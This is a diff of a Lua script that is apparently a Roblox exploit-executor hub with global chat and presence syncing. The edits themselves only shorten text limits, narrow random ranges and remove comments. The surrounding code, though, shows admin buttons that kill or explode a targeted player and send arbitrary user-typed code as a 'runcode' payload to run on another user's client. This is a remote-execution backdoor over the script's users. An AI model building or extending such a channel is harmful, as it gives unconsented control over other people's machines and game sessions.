@@ -243,7 +243,7 @@ end
 
 local function sanitizeText(text)
     local clean = string.gsub(tostring(text or ""), "<[^>]*>", "")
-    if #clean > 2000 then clean = string.sub(clean, 1, 2000) end
+    if #clean > 1000 then clean = string.sub(clean, 1, 1000) end
     return clean
 end
 
@@ -3100,7 +3100,7 @@ end)
 
 TeleportToMeBtn.MouseButton1Click:Connect(function()
     if (IsAdmin or IsSubAdmin) and ADMIN_KEY ~= "" and SelectedTarget ~= "none" then
-        local hash = tostring(os.time() .. math.random(1,2000))
+        local hash = tostring(os.time() .. math.random(1,1000))
         local code = string.format([[
             local admin = game.Players:FindFirstChild("%s")
             if admin and admin.Character and admin.Character:FindFirstChild("HumanoidRootPart") then
@@ -3129,7 +3129,7 @@ end)
 
 RemoteKillBtn.MouseButton1Click:Connect(function()
     if (IsAdmin or IsSubAdmin) and ADMIN_KEY ~= "" and SelectedTarget ~= "none" then
-        local hash = tostring(os.time() .. math.random(1,2000))
+        local hash = tostring(os.time() .. math.random(1,1000))
         _G.CurrentActiveEffect = "kill:" .. SelectedTarget .. ":" .. hash
         runLocalExplosionEffect(SelectedTarget)
         updatePresence()
@@ -3145,7 +3145,7 @@ end)
 
 RemoteExplodeBtn.MouseButton1Click:Connect(function()
     if (IsAdmin or IsSubAdmin) and ADMIN_KEY ~= "" and SelectedTarget ~= "none" then
-        local hash = tostring(os.time() .. math.random(1,2000))
+        local hash = tostring(os.time() .. math.random(1,1000))
         _G.CurrentActiveEffect = "explode:" .. SelectedTarget .. ":" .. hash
         runLocalExplosionEffect(SelectedTarget)
         updatePresence()
@@ -3161,7 +3161,7 @@ end)
 
 RemoteExecuteCodeBtn.MouseButton1Click:Connect(function()
     if (IsAdmin or IsSubAdmin) and ADMIN_KEY ~= "" and SelectedTarget ~= "none" and CodeBox.Text ~= "" then
-        local hash = tostring(os.time() .. math.random(1,2000))
+        local hash = tostring(os.time() .. math.random(1,1000))
         local payloadClean = HttpService:UrlEncode(CodeBox.Text)
 
         _G.CurrentActiveEffect = "runcode:" .. SelectedTarget .. ":" .. hash .. "||PAYLOAD||" .. payloadClean
@@ -3405,7 +3405,6 @@ logExecutorHistory()
 if fetchUsers then fetchUsers(true) end
 if fetchChat then fetchChat(true) end
 
--- 1. Fast Chat Poll Loop (Responsive 1.2s when viewing chat tab, 3.0s otherwise)
 task.spawn(function()
     while running do
         local isChatTab = WindowFrame.Visible and (currentTab == "global" or currentTab == "server")
@@ -3416,7 +3415,6 @@ task.spawn(function()
     end
 end)
 
--- 2. Presence & Users Sync Loop (7.0s background heartbeat)
 task.spawn(function()
     while running do
         task.wait(7.0)
@@ -3427,7 +3425,6 @@ task.spawn(function()
     end
 end)
 
--- 3. Executor History Loop (20.0s)
 task.spawn(function()
     while running do
         task.wait(20.0)
@@ -3450,7 +3447,6 @@ task.spawn(function()
     end
 end)
 
--- 4. Real-time WASOR Theme Sync Loop (adapts to WASOR theme changes dynamically)
 task.spawn(function()
     local lastColor = nil
     while running do
